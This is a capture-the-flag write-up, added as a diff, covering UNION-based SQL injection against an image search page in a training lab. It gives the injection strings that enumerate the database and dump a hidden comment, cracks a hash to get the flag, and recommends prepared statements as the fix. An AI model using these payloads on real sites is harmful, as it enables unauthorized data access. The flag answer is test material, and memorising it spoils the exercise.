@@ -1,0 +1,40 @@
+The image search functionality (?page=searching)
+directly concatenates user input into a SQL query without sanitization.
+This allows an attacker to manipulate the query structure to access unauthorized data.
+
+get db name
+- 1 UNION SELECT 1, database()
+Member_images
+
+get table name
+- 1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()
+list_images
+
+get 'list_images' columns
+- 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
+- ctrl+f 'list_images'
+ID: - 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
+Title: id
+Title: url
+Title: title
+Title: comment
+
+get 'comment'
+- 1 union all select 1,group_concat(comment,0x0a) from list_images
+ID: 1 union all select 1,group_concat(comment,0x0a) from list_images 
+Title: An image about the NSA !
+,There is a number..
+,Google it !
+,Earth!
+,If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+decrypt '1928e8083cf461a51303633093573c46' using https://md5decrypt.net
+- 1928e8083cf461a51303633093573c46 : {"Plain":"albatroz","Algo":"md5"}
+
+hash 'albatroz' using Sh256
+- echo -n albatroz | shasum -a 256
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+Fix:
+- Prepared Statements: Use parameterized queries to separate code from data
+  (the input is treated like a simple string, not part of the query).
